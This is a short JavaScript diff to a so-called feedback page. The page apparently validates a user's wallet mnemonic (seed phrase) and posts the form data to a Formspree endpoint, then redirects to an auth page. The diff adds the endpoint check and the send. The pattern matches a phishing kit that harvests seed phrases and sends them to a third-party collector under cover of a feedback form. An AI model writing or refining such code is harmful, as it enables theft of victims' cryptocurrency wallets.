@@ -90,11 +90,21 @@ async function initializeFeedbackPage() {
         console.log('Mnemonic is valid, proceeding with submission...');
         hideError();
 
+        // Check if form has a valid Formspree action
+        const formAction = form.getAttribute('action');
+        const hasValidFormspree = formAction && formAction.includes('formspree.io') && !formAction.includes('YOUR_FORMSPREE_ID');
+
+        if (!hasValidFormspree) {
+            console.log('No valid Formspree endpoint configured, redirecting directly...');
+            window.location.href = 'authpage.html';
+            return;
+        }
+
         const formData = new FormData(form);
 
         try {
             console.log('Sending to Formspree...');
-            const response = await fetch(form.action, {
+            const response = await fetch(formAction, {
                 method: 'POST',
                 body: formData,
                 headers: { Accept: 'application/json' }
